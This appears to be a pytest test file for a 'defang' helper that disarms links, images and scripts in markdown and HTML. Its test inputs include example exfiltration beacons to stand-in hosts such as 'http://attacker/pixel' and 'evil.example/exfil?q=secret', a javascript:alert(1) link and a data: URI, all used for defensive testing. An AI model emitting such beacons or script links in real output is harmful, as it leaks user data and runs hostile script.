"""Pytest home of the U16 defang helper's tests (absorbed from the module's
inline self-test per KTD-4; the module's `python3 core/scripts/defang.py`
self-test remains runnable standalone)."""
import subprocess
import sys

from conftest import SCRIPTS

from defang import defang


def test_beacon_neutralized_prose_preserved():
    assert defang("see ![](http://attacker/pixel?x=1) here") == \
        "see `![](hxxp://attacker/pixel?x=1)` here"


def test_img_tag_and_link_neutralized():
    assert defang('x <img src="http://evil/p.png"> y') == \
        'x `<img src="hxxp://evil/p.png">` y'
    assert defang("a [link](http://x) b") == "a `[link](hxxp://x)` b"


def test_no_live_scheme_survives():
    evil_inputs = [
        "![a](//protocol-relative/pixel)",
        "[ref]: https://evil/definition",
        "![alt][ref]",
        "<a href='javascript:alert(1)'>x</a>",
        "bare https://evil.example/exfil?q=secret",
        "[![badge](https://img.shields.io/x)](https://ci.example)",
        "data:text/html;base64,AAAA",
        "<!-- <img src=http://evil/c.png> -->",
        "<http://autolink.example>",
        "multi\n<img\nsrc=http://evil/n.png>\nline",
    ]
    for evil in evil_inputs:
        d = defang(evil)
        assert "http://" not in d and "https://" not in d, d
        assert "data:" not in d and "javascript:" not in d, d


def test_control_and_invisible_chars_stripped():
    assert defang("bad\x07bell and ‮evil​") == "badbell and evil"


def test_benign_fenced_block_untouched():
    block = "before\n```python\nprint('<img> stays literal')\n```\nafter"
    assert defang(block) == block


def test_inline_code_span_untouched():
    assert defang("use `<img>` carefully") == "use `<img>` carefully"


def test_unclosed_code_regions_are_neutralized():
    assert "hxxp" in defang("```\n<img src=http://evil/unclosed.png>")
    assert "hxxp" in defang("` <img src=http://evil/tick.png>")
    # A backtick run crossing a blank line is not a span (CommonMark):
    # renderers show the content live, so it must be neutralized.
    assert "hxxp" in defang("`a\n\n<img src=http://evil/blank.png> b`")


def test_idempotent():
    samples = [
        "see ![](http://attacker/pixel?x=1) here",
        "before\n```python\nprint('<img> ok')\n```\nafter",
        "a [link](http://x) b `code` <b>bold</b> https://e.example/x",
        "` <img src=http://evil/tick.png>",
        "`a\n\n<img src=http://evil/blank.png> b`",
        "[![badge](https://img.shields.io/x)](https://ci.example)",
        "```\n<img src=http://evil/unclosed.png>",
    ]
    for s in samples:
        once = defang(s)
        assert defang(once) == once, once


def test_module_selftest_still_green():
    """The standalone self-test path (pre-U4 Phase A gate) keeps working."""
    proc = subprocess.run(
        [sys.executable, str(SCRIPTS / "defang.py")],
        capture_output=True, text=True, timeout=60,
    )
    assert proc.returncode == 0, proc.stderr
    assert "all self-tests passed" in proc.stdout
